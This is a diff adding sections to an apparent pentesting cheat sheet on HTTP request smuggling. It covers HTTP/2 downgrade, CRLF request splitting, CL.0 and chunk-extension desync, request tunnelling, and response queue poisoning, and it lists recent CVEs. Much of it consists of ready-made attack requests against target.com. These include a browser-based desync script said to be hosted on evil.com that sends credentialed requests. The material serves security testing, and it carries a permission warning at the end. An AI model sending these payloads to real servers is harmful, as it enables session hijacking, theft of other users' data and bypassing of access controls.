@@ -273,3 +273,222 @@ X: x'''
 - Normalize headers before forwarding
 - Reject ambiguous requests (both CL and TE)
 - Drop requests with TE obfuscation
+
+---
+
+## H2 Downgrade Attacks
+
+> Source: PortSwigger Research (James Kettle, Black Hat 2021/2025), Imperva 2025, Akamai 2025
+
+HTTP/2 front-ends terminate TLS and downgrade to HTTP/1.1 before forwarding to backends. This creates new smuggling surfaces because H2 headers are framed (not CRLF-delimited) but get converted to CRLF-based H1.1.
+
+### H2.CL — Falsified Content-Length in HTTP/2
+
+Front-end uses H2 framing (ignores CL), back-end uses H1.1 CL for body boundary:
+
+```
+# HTTP/2 request with false content-length: 0
+:method  POST
+:path    /example
+:authority  target.com
+content-type  application/x-www-form-urlencoded
+content-length  0
+
+GET /admin HTTP/1.1
+Host: target.com
+Content-Length: 10
+
+x=1
+```
+
+After H2→H1 downgrade, the backend sees `Content-Length: 0` and treats `GET /admin` as a new request.
+
+*Affected: Netty (CVE-2021-21295), various CDNs*
+
+### H2.X — Request Splitting via CRLF Injection
+
+Inject `\r\n\r\n` into an H2 header value to split the H1.1 output into two requests:
+
+```
+:method  GET
+:path    /
+:authority  target.com
+foo  bar\r\n\r\nGET /admin HTTP/1.1\r\nX-Ignore: x
+```
+
+Backend receives 2 requests but front-end expects 1 response → second response served to next client. Enables **response queue poisoning** (session hijacking).
+
+### Request Line Injection via :method Pseudo-Header
+
+```
+:method  GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nx: x
+:path    /ignored
+:authority  target.com
+```
+
+After downgrade, injects `Transfer-Encoding: chunked` into the H1.1 request line. Bypasses patches that filter header values but not pseudo-headers.
+
+### H2 Downgrade via Cloudflare / Akamai
+
+Both Cloudflare and Akamai terminate HTTP/2 and proxy HTTP/1.1 internally. CRLF in an H2 header value passes to the H1.1 backend as a header separator:
+
+```
+header: value\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com
+```
+
+---
+
+## CL.0 Desync
+
+Some endpoints implicitly treat `Content-Length` as 0 (GET, HEAD, or endpoints that reject bodies). No ambiguous TE/CL needed:
+
+```http
+POST /accessible-endpoint HTTP/1.1
+Host: target.com
+Content-Length: 34
+Connection: keep-alive
+
+GET /sensitive-path HTTP/1.1
+Foo: x
+```
+
+Front-end sends all 34 bytes. Back-end ignores the body for this endpoint → `GET /sensitive-path` becomes a new request.
+
+**Conditions:**
+- Back-end ignores body for the target endpoint
+- Connection is keep-alive (reused)
+
+---
+
+## Chunked Extension Desync (Imperva, August 2025)
+
+Exploits ambiguous parsing of chunk extensions (`;` without name = RFC 9112 violation):
+
+```http
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+
+a;
+<10 bytes>
+0
+
+GET /admin HTTP/1.1
+Host: target.com
+```
+
+- Front-end: ignores bare `;`, processes as normal chunk
+- Back-end: interprets `\n` after `;` as end of chunk header → desync
+
+*Source: Imperva Blog, August 2025*
+
+---
+
+## Request Tunnelling via HTTP/2
+
+When the front-end doesn't multiplex connections across users, **request tunnelling** allows exfiltrating internal headers added by the front-end (IP addresses, auth tokens, `X-Forwarded-*`):
+
+```
+:method  POST
+:path    /comment
+:authority  target.com
+content-type  application/x-www-form-urlencoded
+foo  bar\r\nContent-Length: 200\r\n\r\ncomment=
+```
+
+The front-end's internal headers get appended into `comment=` parameter value → captured in response or stored.
+
+### Blind Tunnelling → Non-Blind via HEAD
+
+```
+:method  HEAD
+:path    /example
+:authority  target.com
+foo  bar\r\n\r\nGET /tunnelled HTTP/1.1\r\nHost: target.com\r\nX: x
+```
+
+HEAD responses include `Content-Length` but no body. Some front-ends read that many bytes from the back-end response, capturing part of the tunnelled response.
+
+---
+
+## Browser-Powered (Client-Side) Desync
+
+No direct server access needed — exploit via victim's browser:
+
+```html
+<!-- Hosted on evil.com — victim visits while logged into target -->
+<script>
+fetch('https://target.com/', {
+    method: 'POST',
+    body: 'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
+    mode: 'no-cors',
+    credentials: 'include'
+});
+</script>
+```
+
+Browser sends 1 request; server desyncs. Next response serves attacker-controlled content to victim.
+
+---
+
+## Response Queue Poisoning — Session Hijacking
+
+Most impactful cross-user technique. Smuggle a complete second request — its response goes to the next user:
+
+```http
+POST /vulnerable HTTP/1.1
+Host: target.com
+Content-Length: 44
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: target.com
+```
+
+Back-end processes 2 requests but front-end only expects 1 response. The second response (from `GET /`) queues and is served to the next arbitrary client → leaks their session cookies, auth tokens, or sensitive data.
+
+---
+
+## Recent CVEs
+
+| CVE | Affected | Description | CVSS |
+|-----|----------|-------------|------|
+| CVE-2025-55315 | ASP.NET Core Kestrel + proxies | CL/TE disagreement, low-priv user bypasses WAF+auth | 9.9 |
+| CVE-2025-32094 | Akamai (March 2025) | OPTIONS + obs-fold header continuation | High |
+| CVE-2025-54142 | Akamai (August 2025) | OPTIONS with CL+TE body → request smuggling | High |
+
+```http
+# CVE-2025-54142 pattern
+OPTIONS /api HTTP/1.1
+Host: target.com
+Content-Length: 45
+Transfer-Encoding: chunked
+
+0
+
+GET /sensitive-admin-endpoint HTTP/1.1
+```
+
+---
+
+## Detection
+
+### Using HTTP Request Smuggler (Burp Extension)
+
+1. Install HTTP Request Smuggler from BApp Store
+2. Run against target with `Scan` mode
+3. Check for `CL.TE`, `TE.CL`, `CL.0`, and H2 variants
+
+### Manual Detection Flow
+
+```bash
+# CL.TE: send ambiguous request, check for timeout
+# TE.CL: send ambiguous request, check for timeout
+# CL.0: send POST body to GET-only endpoint, check for unexpected routing
+# H2: test via Burp Repeater with HTTP/2 + CRLF in header values
+```
+
+!!! warning "Race condition"
+    Smuggling tests affect other users' requests. Only test in controlled environments or with explicit permission.
